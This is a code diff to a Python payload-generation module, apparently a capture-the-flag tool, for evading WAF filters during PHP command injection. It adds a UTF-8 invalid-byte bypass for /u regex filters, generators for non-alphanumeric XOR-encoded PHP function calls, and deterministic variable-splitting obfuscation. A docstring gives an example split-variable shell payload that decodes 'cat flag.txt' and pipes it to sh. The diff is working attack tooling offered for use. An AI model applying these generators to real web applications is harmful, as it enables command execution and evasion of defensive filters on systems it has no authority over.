@@ -1,9 +1,22 @@
 import base64
+import hashlib
+import random
 import re
+import string
 import urllib.parse
 
 
 DEFAULT_PHP_VERSION = (7, 0, 0)
+
+PHP_REGEX_DELIMITERS = "/#~%"
+
+_PHP_REGEX_FLAG_MAP = {
+    "i": re.IGNORECASE,
+    "s": re.DOTALL,
+    "m": re.MULTILINE,
+    "x": re.VERBOSE,
+    "u": re.UNICODE,
+}
 
 
 def parse_php_version(value, default=DEFAULT_PHP_VERSION):
@@ -57,6 +70,21 @@ def php_version_before(version, limit):
     return parse_php_version(version) < parse_php_version(limit)
 
 
+def split_regex_literal(literal):
+    text = str(literal or "").strip()
+    if len(text) < 2 or text[0] not in PHP_REGEX_DELIMITERS:
+        return None, ""
+    opener = text[0]
+    last = text.rfind(opener)
+    if last <= 0:
+        return None, ""
+    body = text[1:last]
+    flags = text[last + 1 :]
+    if flags and not re.fullmatch(r"[A-Za-z]*", flags):
+        return None, ""
+    return body, flags
+
+
 def _strip_trailing_regex_flags(text: str) -> str:
     """Strip trailing regex flags like /i, /is from the end of a waf_words string."""
     m = re.search(r'/[ism]{1,3}$', text)
@@ -87,22 +115,33 @@ def parse_waf_chars(waf_chars: str):
     """
     解析 WAF 过滤字符
     Example: $#!@.
+
+    Space is kept: it is the single most commonly filtered character and was
+    previously dropped silently, which made `waf_chars=" "` a no-op. Only
+    line breaks/tabs are discarded so that pasting a multi-line list does not
+    silently add newline blocking.
     """
     if not waf_chars:
         return set()
-    return {ch for ch in waf_chars if not ch.isspace()}
+    return {ch for ch in waf_chars if ch not in "\r\n\t"}
 
 
 def parse_waf_regex(waf_regex: str):
     """
     解析 WAF 正则表达
-    需要用 / ... / 进行包裹
-    Example: /[A-Za-z0-9_$]/
+    需要用 / ... / 进行包裹，也接受 PHP 的 #...#, ~...~, %...% 分隔符
+    Example: /[A-Za-z0-9_$]/ or #flag|cat#i
     """
     if not waf_regex:
         return None
     pattern = waf_regex.strip()
     flags = 0
+    delimited_body, delimited_flags = split_regex_literal(pattern)
+    if delimited_body is not None:
+        try:
+            return re.compile(delimited_body, _parse_regex_flags(delimited_flags))
+        except re.error:
+            return None
     if pattern.startswith("/") and pattern.count("/") >= 2:
         last = pattern.rfind("/")
         flag_str = pattern[last + 1 :]
@@ -112,6 +151,16 @@ def parse_waf_regex(waf_regex: str):
         return re.compile(pattern, flags)
     except re.error:
         return None
+
+
+def parse_waf_regex_with_error(waf_regex: str):
+    text = str(waf_regex or "").strip()
+    if not text:
+        return None, ""
+    compiled = parse_waf_regex(text)
+    if compiled is None:
+        return None, f"waf_regex is not a valid regular expression: {text}"
+    return compiled, ""
 
 
 def dedupe_preserve_order(items):
@@ -128,12 +177,46 @@ def dedupe_preserve_order(items):
     return result
 
 
-def is_payload_allowed(payload: str, waf_words, waf_chars, waf_regex, limit_length: int):
+UTF8_BREAK_BYTE = b"\xff".decode("utf-8", "surrogateescape")
+
+
+def has_lone_surrogate(text: str) -> bool:
+    return any(0xDC80 <= ord(ch) <= 0xDCFF for ch in str(text or ""))
+
+
+def encode_payload_bytes(text: str) -> bytes:
+    return str(text or "").encode("utf-8", "surrogateescape")
+
+
+def regex_has_utf8_flag(waf_regex: str) -> bool:
+    text = str(waf_regex or "").strip()
+    if not text:
+        return False
+    body, flags = split_regex_literal(text)
+    if body is not None:
+        return "u" in flags.lower()
+    match = re.search(r"/[a-z]*u[a-z]*$", text, re.I)
+    return bool(match)
+
+
+def is_payload_allowed(
+    payload: str,
+    waf_words,
+    waf_chars,
+    waf_regex,
+    limit_length: int,
+    allow_utf8_break: bool = False,
+):
     """
     检查 payload 是否可通过 WAF
+
+    allow_utf8_break mirrors PHP semantics for a /u regex: an invalid UTF-8
+    subject makes preg_match() return false, so the filter never matches.
     """
     if limit_length is not None and len(payload) > limit_length:
         return False
+    if allow_utf8_break and has_lone_surrogate(payload):
+        return True
     if waf_words:
         lower_payload = payload.lower()
         for word in waf_words:
@@ -281,6 +364,71 @@ def generate_php_xor(text: str):
     return f"('{xor_str1}'^'{xor_str2}')"
 
 
+_NOALNUM_PRINTABLE = [
+    chr(code) for code in range(0x20, 0x7F) if not chr(code).isalnum()
+]
+
+
+def _noalnum_xor_pair(code: int):
+    for left in _NOALNUM_PRINTABLE:
+        for right in _NOALNUM_PRINTABLE:
+            if ord(left) ^ ord(right) == code:
+                return left, right
+    return None
+
+
+def _php_single_quote(value: str) -> str:
+    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"
+
+
+def generate_noalnum_string(text: str):
+    parts = []
+    for char in str(text or ""):
+        pair = _noalnum_xor_pair(ord(char))
+        if pair is None:
+            return None
+        parts.append(
+            f"({_php_single_quote(pair[0])}^{_php_single_quote(pair[1])})"
+        )
+    if not parts:
+        return "''"
+    return ".".join(parts)
+
+
+def generate_noalnum_call(func: str, arg: str):
+    func_expr = generate_noalnum_string(func)
+    if func_expr is None:
+        return None
+
+    needs_slash = "/" in str(arg or "")
+    arg_parts = []
+    for char in str(arg or ""):
+        if char == "/":
+            arg_parts.append("$_________")
+            continue
+        expr = generate_noalnum_string(char)
+        if expr is None:
+            return None
+        arg_parts.append(expr)
+    if not arg_parts:
+        return None
+    arg_expr = ".".join(arg_parts)
+
+    prefix = ""
+    if needs_slash:
+        prefix = (
+            "$__=('>'>'<');"
+            "$___=$__+$__;"
+            "$____=$___+$___;"
+            "$_____=$____+$____;"
+            "$______=$_____+$_____;"
+            "$_______=$______+$______;"
+            "$________=('#'^'@').('@'^'(').('['^')');"
+            "$_________=$________($_______+$_____+$____+$___+$__);"
+        )
+    return f"{prefix}({func_expr})({arg_expr});"
+
+
 def generate_php_not(text: str):
     """
     PHP 按位取反
@@ -403,19 +551,26 @@ def obfuscate_filename_quotes(path: str):
     return "".join(parts)
 
 
-def _split_string_to_vars(text: str, exclude_vars=None):
+def _stable_rng(text: str):
+    digest = hashlib.sha256(str(text).encode("utf-8", "replace")).digest()
+    return random.Random(int.from_bytes(digest[:8], "big"))
+
+
+def _split_string_to_vars(text: str, exclude_vars=None, seed=None):
     """
     随机拆分字符串并分配给随机变量
     主要和变量拆分绕过适配
     Example: b=bas;c=e64;a=s;c=h;echo%2Y2F0IGZsYWcudHh0|$b$c%20-d|$a$c
     return: (assignment_str, concatenation_str)
-    """
-    import random
-    import string
 
+    The split is pseudo-random but seeded from the text itself, so the same
+    input always yields the same payload. Unseeded randomness made payload
+    output, "shortest payload" selection and tests non-reproducible.
+    """
     if not text:
         return "", ""
 
+    rng = random.Random(seed) if seed is not None else _stable_rng(text)
     excluded = set(exclude_vars or [])
 
     # 生成随机切分点
@@ -424,9 +579,9 @@ def _split_string_to_vars(text: str, exclude_vars=None):
         splits = [text]
     else:
         # 随机切成 2 到 4 段
-        num_parts = random.randint(2, min(length, 4))
+        num_parts = rng.randint(2, min(length, 4))
         # 生成随机切分索引
-        indices = sorted(random.sample(range(1, length), num_parts - 1))
+        indices = sorted(rng.sample(range(1, length), num_parts - 1))
         indices = [0] + indices + [length]
 
         splits = []
@@ -440,9 +595,9 @@ def _split_string_to_vars(text: str, exclude_vars=None):
     available_chars = string.ascii_lowercase
 
     for part in splits:
-        var_name = random.choice(available_chars)
+        var_name = rng.choice(available_chars)
         while var_name in vars_used or var_name in excluded:
-            var_name = random.choice(available_chars) + random.choice(available_chars)
+            var_name = rng.choice(available_chars) + rng.choice(available_chars)
 
         vars_used.append(var_name)
         assignments.append(f"{var_name}={part}")
@@ -488,13 +643,12 @@ def _strip_regex_delimiters(token: str):
 def _parse_regex_flags(flag_str: str):
     """
     解析正则
+
+    PHP and Python share i/s/m/x/u semantics for the flags we care about.
+    Unknown PHP-only modifiers (A/D/S/U/X/J) are ignored instead of being
+    folded into the pattern text.
     """
     flags = 0
-    for ch in flag_str:
-        if ch == "i":
-            flags |= re.IGNORECASE
-        elif ch == "s":
-            flags |= re.DOTALL
-        elif ch == "m":
-            flags |= re.MULTILINE
+    for ch in str(flag_str or ""):
+        flags |= _PHP_REGEX_FLAG_MAP.get(ch, 0)
     return flags
